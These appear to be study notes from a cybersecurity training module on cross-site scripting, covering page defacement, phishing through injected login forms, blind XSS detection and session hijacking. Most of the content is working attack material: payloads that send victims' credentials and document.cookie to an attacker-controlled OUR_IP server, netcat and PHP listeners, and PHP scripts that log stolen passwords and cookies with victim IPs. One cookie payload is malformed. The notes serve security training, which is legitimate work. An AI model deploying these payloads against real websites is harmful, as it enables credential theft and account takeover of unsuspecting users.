# XSS Attacks

Some common attacks via XSS are:
- Defacing
- Phishing
- Session Hijacking

## Defacing

Means changing the look of the website for anyone who visits it.

**Elements**
There are four elements that are usually used to change the main look of a we page:
- Background Color: `document.body.style.background`
- Background: `document.body.background`
- Page Title: `document.title`
- Page Text: `DOM.innerHTML`

**Examples**

*Changing the background color:*
```html
<script>document.body.style.background = "#141d2b"</script>
```

*Changing the background:*
```html
<script>document.body.background = "https://www.iamge.url/path/to/image"</script>
```

*Changing the webpage title:*
```html
<script>document.title = "Hacked"</script>
```

*Changing the body:*
```js
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

Adding a more complete html:

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

## Phishing

Phishing via XSS means utilizing legitimate-looking information to trick the victims to send their information to the attacker.

So, a common method is injecting fake login forms that send the login details to the attacker's server.

To do this attack, first find an XSS payload that successfully executes JS code on the page.

After identifying it we can proceed with the attack, by injecting HTML code that displays a login form, which should send login information to a server that we are listening on.

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

Then, prepare a XSS code and test it on the vulnerable form. `document.write()` can be used to write HTML code to the vulnerable page, and use it in the XSS payload. After minifying it should look like this:

```js
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

Then to start a listening server, it can be done via different methods, and one of them is using `nc` tool:

```sh
sudo nc -lvnp 80
```

After the victim provides the credentials, it will get an `Unable to connect`, which raises suspicions, so we can use a PHP script that logs the credentials from the request and then returns the victim to the original page.

Create a file `index.php` and save it in some directory like `/tmp/tmpserver/`.

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Now in the same directory start a PHP listening server:

```php
sudo php -S 0.0.0.0:80
```

## Session Hijacking

Cookies are used to maintain a user's session throughout different browsing sessions. 

So, if the attacker gets the cookie, they may be able to login without knowing the credentials.

This usually happens when an attacker is able to execute JS code on the victim's browser, then collecting cookies and sending them to the attacker's server.

### XSS Dection

This happens when the vulnerbaility is triggered on a page taht we don't have access to.

It usually happens with forms only accessible by some users (e.g. Admins), and some examples are:
- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header

**Example**
We visit a page that has a login and registration form.

We want to register, and put there a *username*.

Then after clicking on *Register* I receive the following:

```sh
Thank you for registering.
An Admin will review your registration request.
```

So, this means we don't get our input reflected, and we can't see the `alerts` that we send, as we don't have access to the *Admin panel*.

In this case we will use a **JS payload that sends an HTTP request back to our server**.

But this raises two issues:
- Which field is vulnerable?
- Which payload to use?

We can solve them by **Loading a Remote Script**. Well, not exactly, but by using the same methodology.

For example, in the form of registration there are the following fields `username`, `email`, and we want to try which is vulnerable.

So, we start a server to listen to, and then we try to load some scripts that don't exist, but that have the name of the field:

```sh
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field
```

### Session Hijacking

After we find a working payload then we can exploit it and perform Session Hijacking attack.

For the attack to be successful it requires JS payload to send us the required data and a PHP script hosted on our server to grab and parse the transmitted data.

Some JS payloads:

```js
document.location='http://server/index.php?c='=document.cookie;
new Image().src='http://server/index.php?c='+document.cookie;
```

The first one navigates to our cookie grabber PHP page, which can look suspicious.

The second one simply adds an image to the page, which is not very malicious looking.

Write them on a JS file, and change the URL in the XSS payload found earlier.

Sometimes there are many cookies, and we don't know which cookie value belongs to which cookie header, and in htis case we write a PHP script to split them with a new line and write them to a file, so if multiple victims trigger the XSS exploit, we get all of them ordered in a file.

Save the following script as `index.php`:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Once the victim visits the vulnerable page and views the payload, we will get two requests on our server, one for `script.js` which makes another request with the cookie value:

```sh
[200]: /script.js
[200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

Then to use this cookie we press `Shift F9` in Firefox go to `Storage` tab and click on the `+` button and put our cookie.

